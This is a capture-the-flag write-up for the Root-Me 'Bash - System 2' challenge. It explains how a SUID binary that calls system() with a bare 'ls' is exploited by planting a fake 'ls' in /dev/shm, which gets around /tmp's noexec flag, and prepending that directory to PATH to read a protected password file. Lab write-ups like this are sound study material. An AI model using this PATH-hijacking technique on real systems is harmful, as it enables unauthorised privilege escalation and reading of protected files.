# Bash - System 2

**Category** : App - Script  
**Difficulty** : Very easy  
**Points** : 5  
**Link** : [Root-Me](https://www.root-me.org/en/Challenges/App-Script/Bash-System-2)

---

## Description

Similar to Bash - System 1, but with command arguments.

---

## Analysis

The vulnerable code:
```c
setreuid(geteuid(), geteuid());
system("ls -lA /challenge/app-script/ch12/.passwd");
```

Same vulnerability as System 1: `system()` searches for `ls` in the PATH. The arguments `-lA` don't change the attack strategy.

---

## Methodology

**Issue:** `/tmp` is mounted with `noexec` flag — cannot execute files there.

**Solution:** Use `/dev/shm` instead.

**1. Create a fake `ls` in `/dev/shm`**
```bash
cd /dev/shm
cat > ls << 'EOF'
#!/bin/bash
cat /challenge/app-script/ch12/.passwd
EOF
chmod +x ls
```

**2. Modify the PATH**
```bash
export PATH=/dev/shm:$PATH
```

**3. Execute the SUID binary**
```bash
~/ch12
```

---

## Solution

The binary executes our fake `ls` (ignoring the arguments `-lA`), which displays the password file.

**Flag validated:** ✓

---

## What I learned

- **Bypass noexec**: `/dev/shm` is often executable when `/tmp` is not
- **PATH hijacking resilience**: arguments don't prevent the attack
- Same principle as System 1, different execution environment